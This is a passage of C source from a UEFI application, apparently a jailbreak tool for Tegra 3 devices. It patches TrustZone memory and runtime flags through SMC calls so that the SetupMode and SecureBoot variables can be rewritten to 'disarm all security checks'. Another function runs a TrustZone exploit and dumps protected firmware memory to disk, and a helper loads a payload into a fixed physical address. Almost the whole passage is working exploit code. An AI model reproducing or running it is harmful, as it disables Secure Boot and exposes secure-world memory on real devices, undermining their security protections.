    Status = EFI_NOT_FOUND;
    goto exit;
  }

RuntimePhase1:
  //CortexA15CachePrime();

  Print(L"Disabling MMU...\n");

  // Revert runtime mode flags, phase 1
  ArmDisableCachesAndMmu();
  //ArmInvalidateTlb();
  //ArmInvalidateDataCache();
  //ArmInvalidateInstructionCache();

  *(volatile UINT32 *)pRuntimeFlag1 = 0;
  *(volatile UINT32 *)pRuntimeFlag2 = 0;
  ArmDataSynchronizationBarrier();
  ArmEnableMmu();
  ArmEnableDataCache();
  ArmEnableInstructionCache();

  Print(L"MMU re-enabled + caches re-enabled\n");

  // Re-trigger runtime mode switch, which clears the old registration
  UINT32 Ret = 0;
  Ret        = ArmCallSmcHelper(0x03, 0x05, 0, 0);
  Print(L"ArmCallSmcHelper: 0x%x\n", Ret);
  if (Ret == 1) {
    Print(L"Retrying... -- runtime mode patch phase 1\n");
    goto RuntimePhase1;
  }
  else if (Ret != 0) {
    Print(L"Unexpected call from ArmCallSmcHelper - runtime mode patch phase "
          L"1\n");
    goto exit;
  }

PatchStringPhase1:
  //CortexA15CachePrime();

  Print(L"Disabling MMU...\n");

  // Revert runtime mode flags, phase 2
  // Patch string, phase 1
  ArmDisableCachesAndMmu();
  ///ArmInvalidateTlb();
 // ArmInvalidateDataCache();
  //ArmInvalidateInstructionCache();

  *pRuntimeFlag1 = 0;
  *pRuntimeFlag2 = 0;
  // String is located at 
  volatile char *pSetupModeString =
      ((volatile char *)pTzGetHashStateString +
       pFwInfo->UefiSecureWorldSetupModeStringOffset);
  // String is located at Base+0x98130, delta = 0x504
  volatile char *pSecureBootString =
      ((volatile char *)pTzGetHashStateString +
       pFwInfo->UefiSecureWorldSecureBootStringOffset);
  // BetupMode, BecureBoot
  *pSetupModeString  = 'B';
  *pSecureBootString = 'B';
  ArmDataSynchronizationBarrier();
  ArmEnableMmu();
  ArmEnableDataCache();
  ArmEnableInstructionCache();

  Print(L"MMU re-enabled + caches re-enabled\n");

  // Re-register shared memory buffer area
  // To let variable services pick it up again
  Ret = ArmCallSmcHelper(0x03, 0x06, (UINT32)SharedMemoryStartAddress, 0x24008);
  Print(L"ArmCallSmcHelper: 0x%x\n", Ret);
  if (Ret == 1) {
    Print(L"Retrying... -- shared memory address registration\n");
    goto PatchStringPhase1;
  }
  else if (Ret != 0) {
    Print(L"Unexpected call from ArmCallSmcHelper - shared memory address "
          L"registration\n");
    goto exit;
  }

  // Ready to patch the variable
  Print(L"Thinking....\n");
  UINT8 Data = 1;
  // SecureMode = 1 to disarm all security checks
  Status = gRT->SetVariable(
      L"SetupMode", &gEfiGlobalVariableGuid,
      EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS |
          EFI_VARIABLE_NON_VOLATILE,
      sizeof(UINT8), &Data);
  if (!EFI_ERROR(Status)) {
    Data = 0;
    // SecureBoot = 0 to explicitly disable Secure Boot
    Status = gRT->SetVariable(
        L"SecureBoot", &gEfiGlobalVariableGuid,
        EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS |
            EFI_VARIABLE_NON_VOLATILE,
        sizeof(UINT8), &Data);
    if (!EFI_ERROR(Status)) {
      Print(L"Have fun\n");
      UINTN VarSize = sizeof(UINT8);
      Status        = gRT->GetVariable(
          L"SetupMode", &gEfiGlobalVariableGuid, NULL, &VarSize, &Data);
      if (!EFI_ERROR(Status)) {
        Print(L"SetupMode = 0x%x\n", Data);
      }

      Status = gRT->GetVariable(
          L"SecureBoot", &gEfiGlobalVariableGuid, NULL, &VarSize, &Data);
      if (!EFI_ERROR(Status)) {
        Print(L"SecureBoot = 0x%x\n", Data);
      }
    }
    else {
      Print(L"Something happened: 0x%x (setting SecureBoot)\n", Status);
    }
  }
  else {
    Print(L"Something happened: 0x%x (setting SetupMode)\n", Status);
  }

exit:
  FinalizeApp();
}

//////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////

EFI_STATUS loadPayloadIntoMemory(EFI_PHYSICAL_ADDRESS memoryAddress, short unsigned int fileName[], size_t* fileSize)
{
	EFI_LOADED_IMAGE *loaded_image = NULL;
	EFI_GUID loaded_image_protocol = LOADED_IMAGE_PROTOCOL;
	EFI_STATUS status;
	EFI_GUID sfspGuid = EFI_SIMPLE_FILE_SYSTEM_PROTOCOL_GUID;
	EFI_SIMPLE_FILE_SYSTEM_PROTOCOL* fs = NULL;

	status = gBS->HandleProtocol(
		gImageHandle,
		&loaded_image_protocol,
		(void **) &loaded_image);

	if (status != EFI_SUCCESS)
	{
		Print(L"Failed at 1st HandleProtocol\n");
		return status;
	}

	status = gBS->HandleProtocol(
		loaded_image->DeviceHandle,
		&sfspGuid,
		(void**)&fs);

	if (status != EFI_SUCCESS)
	{
		Print(L"Failed at 2nd HandleProtocol\n");
		return status;
	}

	EFI_FILE_PROTOCOL* fileProtocol = NULL;

	status = fs->OpenVolume(fs, &fileProtocol);
	EFI_FILE_PROTOCOL* file = NULL;

	if (status != EFI_SUCCESS)
	{
		Print(L"Failed at OpenVolume!\n");
		return status;
	}

	status = fileProtocol->Open(
			fileProtocol,
			&file,
			fileName,
			EFI_FILE_MODE_READ,
			EFI_FILE_READ_ONLY | EFI_FILE_HIDDEN | EFI_FILE_SYSTEM);

	if (status != EFI_SUCCESS)
	{
		Print(L"Failed at opening file!\n");
		return status;
	}

	EFI_FILE_INFO *payloadFileInformation = NULL;
	UINTN payloadFileInformationSize = 0;

	status = file->GetInfo(
			file,
			&gEfiFileInfoGuid,
			&payloadFileInformationSize,
			(VOID *) payloadFileInformation);

	if (status != EFI_SUCCESS && status != EFI_BUFFER_TOO_SMALL)
	{
		Print(L"Failed at getting file info! (1)\n");
		return status;
	}

	status = gBS->AllocatePool(
		EfiLoaderData,
		payloadFileInformationSize,
		(void**)&payloadFileInformation);

	if (status != EFI_SUCCESS)
	{
		Print(L"Failed at allocating pool!\n");
		return status;
	}

	SetMem(
		(VOID *)payloadFileInformation,
		payloadFileInformationSize,
		0xFF);

	status = file->GetInfo(
		file,
		&gEfiFileInfoGuid,
		&payloadFileInformationSize,
		(VOID *)payloadFileInformation
	);

	if (status != EFI_SUCCESS)
	{
		Print(L"Failed at getting file info! (2)\n");
		return status;
	}

	EFI_PHYSICAL_ADDRESS payloadFileBuffer = memoryAddress;

	UINTN payloadFileSize = payloadFileInformation->FileSize;

	Print(L"Payloadsize: %u\n", payloadFileSize);

	UINTN Pages = EFI_SIZE_TO_PAGES (payloadFileSize);
	status = gBS->AllocatePages(AllocateAddress, EfiLoaderData, Pages, &payloadFileBuffer);

	if (status != EFI_SUCCESS)
	{
		switch (status)
		{
		case EFI_OUT_OF_RESOURCES:

			break;
		case EFI_INVALID_PARAMETER:

			break;
		case EFI_NOT_FOUND:

			break;
		default:
			break;
		}

		Print(L"Failed at AllocatePages!\n");

		return status;
	}

	SetMem(
		(EFI_PHYSICAL_ADDRESS*)payloadFileBuffer,
		payloadFileSize,
		0xFF);

	status = file->Read(
		file,
		&payloadFileSize,
		(EFI_PHYSICAL_ADDRESS*)payloadFileBuffer
	);

	if (status != EFI_SUCCESS)
	{
		Print(L"Failed at reading file into memory!\n");
		return status;
	}

	*fileSize = payloadFileSize;

	Print(L"File is now in memory at location 0x%08lx!\n", payloadFileBuffer);


	//uart_print("Printing the 1st 4 bytes at 0x84000000: %08x\r\n", *((uint32_t*)(0x84000000)));

	return EFI_SUCCESS;
}

void tegra3dumpfirmware()
{
  EFI_STATUS Status = EFI_SUCCESS;

  DisplayCommonBanner();
  Print(L"\nElevator for TEGRA3\n");

  // Perform the TrustZone exploit, so TrustZone memory
  // can be unprotected from normal world
  Print(L"Hmmm.\n");
  PerformNvTegra3Exploit();
  Print(L"Hmmmmmm.\n");

	/////////////////////////////////////////////	

	  // Dump the firmware from 0x80000000 to 0x82000000
  Print(L"Proceed to dump the firmware!\n");
  ArmDisableCachesAndMmu();
  //ArmInvalidateTlb();
  //ArmInvalidateDataCache();
  //ArmInvalidateInstructionCache();
  CopyMem(g_FirmwareDumpBuffer, (VOID *)0x80000000, DUMP_SIZE); 
  ArmEnableMmu();
  ArmEnableDataCache();
  ArmEnableInstructionCache();
  Print(L"Dump finalized. Save to memory...\n");

  // Save this to file
  EFI_HANDLE *fsHandles     = NULL;
  UINTN       fsHandleCount = 0;

  Status = gBS->LocateHandleBuffer(
      ByProtocol, &gEfiSimpleFileSystemProtocolGuid, NULL, &fsHandleCount,
      &fsHandles);
  if (EFI_ERROR(Status)) {
    Print(L"Failed to get EFI Simple Filesystem Protocol Buffer: %r\n", Status);
    goto exit;
  }

  for (UINTN i = 0; i < fsHandleCount; i++) {
    EFI_SIMPLE_FILE_SYSTEM_PROTOCOL *fsProtocol      = NULL;
    EFI_FILE_PROTOCOL *              rootDirProtocol = NULL;
    EFI_FILE_PROTOCOL *              fileProtocol    = NULL;
    UINTN                            bufferSize = sizeof(g_FirmwareDumpBuffer);

    Status = gBS->HandleProtocol(
        fsHandles[i], &gEfiSimpleFileSystemProtocolGuid, (VOID **)&fsProtocol);
    if (EFI_ERROR(Status)) {
      Print(L"Failed to get EFI Simple Filesystem Protocol: %r\n", Status);
      continue;
    }

    Status = fsProtocol->OpenVolume(fsProtocol, &rootDirProtocol);
    if (EFI_ERROR(Status)) {
      Print(L"Failed to open directory: %r\n", Status);
      continue;
    }

    Status = rootDirProtocol->Open(
        rootDirProtocol, &fileProtocol, L"tzmemdump.bin",
        EFI_FILE_MODE_CREATE | EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE, 0);
    if (EFI_ERROR(Status)) {
      Print(L"Failed to open file: %r\n", Status);
      rootDirProtocol->Close(rootDirProtocol);
      continue;
    }

    Status = fileProtocol->SetPosition(fileProtocol, 0);
    if (EFI_ERROR(Status)) {
      Print(L"Failed to set position of file: %r\n", Status);
      fileProtocol->Close(fileProtocol);
      rootDirProtocol->Close(rootDirProtocol);
      continue;
    }

    Status =
        fileProtocol->Write(fileProtocol, &bufferSize, g_FirmwareDumpBuffer);
    if (EFI_ERROR(Status)) {
      Print(L"Failed to write file: %r\n", Status);
      fileProtocol->Close(fileProtocol);
      rootDirProtocol->Close(rootDirProtocol);
      continue;
    }

    Status = fileProtocol->Flush(fileProtocol);
    fileProtocol->Close(fileProtocol);
    rootDirProtocol->Close(rootDirProtocol);
  }
	
	 Print(L"Saved to memory.\n");
	while(1);
	////////////////////////////
	
exit:
  FinalizeApp();
}
